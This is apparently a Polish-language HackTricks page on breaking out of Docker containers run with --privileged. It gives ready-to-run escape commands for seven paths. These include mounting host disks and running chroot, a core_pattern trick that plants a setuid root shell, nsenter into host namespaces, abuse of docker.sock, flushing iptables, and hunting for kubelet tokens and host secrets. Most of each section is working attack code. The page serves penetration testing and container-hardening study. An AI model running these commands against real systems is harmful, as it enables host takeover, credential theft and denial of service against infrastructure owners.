# Ucieczka z kontenerów `--privileged`

{{#include ../../../banners/hacktricks-training.md}}

## Przegląd

Kontener uruchomiony z opcją `--privileged` nie jest tym samym co zwykły kontener z jednym lub dwoma dodatkowymi uprawnieniami. W praktyce `--privileged` usuwa lub osłabia kilka domyślnych zabezpieczeń runtime, które zazwyczaj izolują workload od niebezpiecznych zasobów hosta. Dokładny efekt nadal zależy od runtime i hosta, ale w przypadku Dockera typowy rezultat to:

- przyznanie wszystkich capabilities
- zniesienie ograniczeń device cgroup
- zaprzestanie montowania wielu kernel filesystems w trybie tylko do odczytu
- usunięcie domyślnie zamaskowanych ścieżek procfs
- wyłączenie filtrowania seccomp
- wyłączenie izolacji AppArmor
- wyłączenie izolacji SELinux lub zastąpienie jej znacznie szerszą etykietą

Najważniejszą konsekwencją jest to, że uprzywilejowany kontener zazwyczaj **nie** potrzebuje subtelnego kernel exploita. W wielu przypadkach może po prostu bezpośrednio wejść w interakcję z urządzeniami hosta, host-facing kernel filesystems lub interfejsami runtime, a następnie przejść do host shell.

## Czego `--privileged` Automatycznie Nie Zmienia

`--privileged` **nie** dołącza automatycznie do host PID, network, IPC ani UTS namespaces. Uprzywilejowany kontener nadal może mieć prywatne namespaces. Oznacza to, że niektóre łańcuchy escape wymagają dodatkowego warunku, takiego jak:

- host bind mount
- współdzielenie host PID
- host networking
- widoczne urządzenia hosta
- zapisywalne interfejsy proc/sys

Te warunki często łatwo spełnić w rzeczywistych błędnych konfiguracjach, ale koncepcyjnie są one niezależne od samego `--privileged`.

## Ścieżki Escape

### 1. Zamontowanie Dysku Hosta Przez Ujawnione Urządzenia

Uprzywilejowany kontener zazwyczaj widzi znacznie więcej device nodes w `/dev`. Jeśli urządzenie blokowe hosta jest widoczne, najprostszym sposobem escape jest jego zamontowanie i wykonanie `chroot` do systemu plików hosta:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
Jeśli partycja root nie jest oczywista, najpierw wylicz układ bloków:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
Jeśli praktycznym rozwiązaniem jest umieszczenie helpera setuid w zapisywalnym montowaniu hosta zamiast użycia `chroot`, pamiętaj, że nie każdy system plików respektuje bit setuid. Szybkie sprawdzenie możliwości po stronie hosta wygląda następująco:
```bash
mount | grep -v "nosuid"
```
Jest to przydatne, ponieważ ścieżki z możliwością zapisu w systemach plików `nosuid` są znacznie mniej interesujące w przypadku klasycznych scenariuszy typu „upuść powłokę setuid i wykonaj ją później”.

Nadużywane są tutaj następujące osłabione zabezpieczenia:

- pełna ekspozycja urządzeń
- szeroki zakres capabilities, szczególnie `CAP_SYS_ADMIN`

Powiązane strony:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Zamontowanie lub ponowne użycie bind mount hosta i `chroot`

Jeśli główny system plików hosta jest już zamontowany wewnątrz kontenera lub jeśli kontener może utworzyć wymagane mounty, ponieważ jest uprzywilejowany, uzyskanie powłoki hosta często dzieli tylko jedno `chroot`:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Jeśli nie istnieje bind mount hosta root, ale storage hosta jest dostępny, utwórz go:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Ta ścieżka wykorzystuje:

- osłabione ograniczenia montowania
- pełne capabilities
- brak izolacji MAC

Powiązane strony:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Wykorzystanie zapisywalnych `/proc/sys` lub `/sys`

Jedną z poważnych konsekwencji użycia `--privileged` jest znaczne osłabienie ochrony procfs i sysfs. Może to ujawnić interfejsy jądra dostępne z poziomu hosta, które normalnie są ukryte lub montowane tylko do odczytu.

Klasycznym przykładem jest `core_pattern`:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Inne ścieżki o wysokiej wartości obejmują:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Ta ścieżka wykorzystuje:

- brak zamaskowanych ścieżek
- brak ścieżek systemowych tylko do odczytu

Powiązane strony:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Użycie pełnych Capabilities do ucieczki opartej na Mount lub Namespace

Privileged container otrzymuje capabilities, które są zazwyczaj usuwane ze standardowych kontenerów, w tym `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN` i wiele innych. Często wystarcza to do przekształcenia lokalnego footholdu w host escape, gdy tylko dostępna jest kolejna exposed surface.

Prostym przykładem jest zamontowanie dodatkowych filesystemów i użycie namespace entry:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
Jeśli współdzielony jest również PID hosta, krok staje się jeszcze krótszy:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Ta ścieżka wykorzystuje:

- domyślny uprzywilejowany zestaw capabilities
- opcjonalne współdzielenie PID hosta

Powiązane strony:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Ucieczka przez runtime sockets

Uprzywilejowany container często ma widoczny stan runtime hosta lub jego sockety. Jeśli socket Docker, containerd lub CRI-O jest osiągalny, najprostszym podejściem jest często użycie API runtime do uruchomienia drugiego containera z dostępem do hosta:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Dla containerd:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Ta ścieżka wykorzystuje:

- uprzywilejowany dostęp do runtime
- bind mounty hosta tworzone za pośrednictwem samego runtime

Powiązane strony:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Usuń skutki uboczne izolacji sieci

`--privileged` samo w sobie nie dołącza do przestrzeni nazw sieci hosta, ale jeśli kontener ma również `--network=host` lub inny dostęp do sieci hosta, cały stos sieciowy staje się modyfikowalny:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Nie zawsze prowadzi to bezpośrednio do host shell, ale może umożliwić denial of service, przechwytywanie ruchu lub dostęp do usług zarządzania dostępnych wyłącznie przez loopback.

Powiązane strony:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Odczytywanie sekretów hosta i stanu środowiska uruchomieniowego

Nawet gdy clean shell escape nie jest natychmiast możliwy, privileged containers często mają wystarczający dostęp, aby odczytywać sekrety hosta, stan kubelet, metadane środowiska uruchomieniowego oraz systemy plików sąsiednich kontenerów:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
Jeśli `/var` jest zamontowany z hosta lub katalogi runtime są widoczne, może to wystarczyć do lateral movement albo kradzieży poświadczeń cloud/Kubernetes jeszcze przed uzyskaniem host shell.

Powiązane strony:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Sprawdzenia

Celem poniższych poleceń jest potwierdzenie, które rodziny escape z privileged-container są natychmiast możliwe.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
Co jest tutaj interesujące:

- pełny zestaw capabilities, zwłaszcza `CAP_SYS_ADMIN`
- zapisywalny dostęp do proc/sys
- widoczne urządzenia hosta
- brak seccomp i ograniczeń MAC
- sockety runtime lub bind mounty głównego katalogu hosta

Dowolny z tych elementów może wystarczyć do post-exploitation. Kilka z nich razem zwykle oznacza, że do compromise hosta z poziomu kontenera wystarczy praktycznie jedno lub dwa polecenia.

## Powiązane strony

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
